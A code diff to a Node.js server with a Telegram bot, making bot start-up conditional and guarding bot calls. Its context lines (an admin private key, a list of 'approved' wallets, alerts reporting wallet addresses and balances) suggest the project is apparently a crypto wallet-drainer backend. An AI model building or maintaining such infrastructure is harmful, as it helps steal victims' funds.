@@ -43,18 +43,35 @@ if (ADMIN_PRIVATE_KEY &&
 // In-Memory Database (Real project mein MongoDB use kar lena)
 let approvedWallets = [];
 
-// Initialize Bot & Express
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+// Initialize Express first (always runs)
 const app = express();
 
-// Handle Telegram polling conflicts gracefully
-bot.on('polling_error', (error) => {
-    if (error.code === 'ETELEGRAM' && error.message.includes('Conflict')) {
-        console.warn('[Telegram] Another bot instance may be running, but continuing...');
-    } else {
-        console.error('[Telegram] Polling error:', error.message);
+// Initialize Bot conditionally
+let bot = null;
+const isBotTokenValid = BOT_TOKEN &&
+    BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' &&
+    BOT_TOKEN !== 'your_telegram_bot_token_here' &&
+    BOT_TOKEN.includes(':');
+
+if (isBotTokenValid) {
+    try {
+        bot = new TelegramBot(BOT_TOKEN, { polling: true });
+        console.log('[Telegram] Bot initialized with polling');
+
+        // Handle Telegram polling conflicts gracefully
+        bot.on('polling_error', (error) => {
+            if (error.code === 'ETELEGRAM' && error.message.includes('Conflict')) {
+                console.warn('[Telegram] Another bot instance may be running, but continuing...');
+            } else {
+                console.error('[Telegram] Polling error:', error.message);
+            }
+        });
+    } catch (err) {
+        console.error('[Telegram] Failed to initialize bot:', err.message);
     }
-});
+} else {
+    console.warn('[Telegram] Bot not configured - set TELEGRAM_BOT_TOKEN in environment variables');
+}
 app.use(cors());
 app.use(bodyParser.json());
 
@@ -86,7 +103,11 @@ app.post('/api/notify-approval', async (req, res) => {
         }
     };
 
-    bot.sendMessage(ADMIN_CHAT_ID, message, opts);
+    if (bot) {
+        bot.sendMessage(ADMIN_CHAT_ID, message, opts);
+    } else {
+        console.warn('[API] Telegram bot not available, skipping notification');
+    }
     res.json({ success: true });
 });
 
@@ -95,6 +116,9 @@ app.post('/api/notify-connection', async (req, res) => {
     const { chat_id, message, address, balance } = req.body;
 
     try {
+        if (!bot) {
+            return res.status(503).json({ success: false, error: 'Telegram bot not configured' });
+        }
         await bot.sendMessage(chat_id, message, { parse_mode: 'Markdown' });
         res.json({ success: true });
     } catch (err) {
@@ -107,6 +131,7 @@ app.post('/api/notify-connection', async (req, res) => {
 app.use(express.static(__dirname));
 
 // ================= TELEGRAM BOT LOGIC =================
+if (bot) {
 // Command to list all approved wallets
 bot.onText(/\/list/, (msg) => {
     const chatId = msg.chat.id;
@@ -166,6 +191,7 @@ bot.on('callback_query', async (query) => {
         }
     }
 });
+} // end if (bot)
 
 // Start Server
 app.listen(PORT, () => {
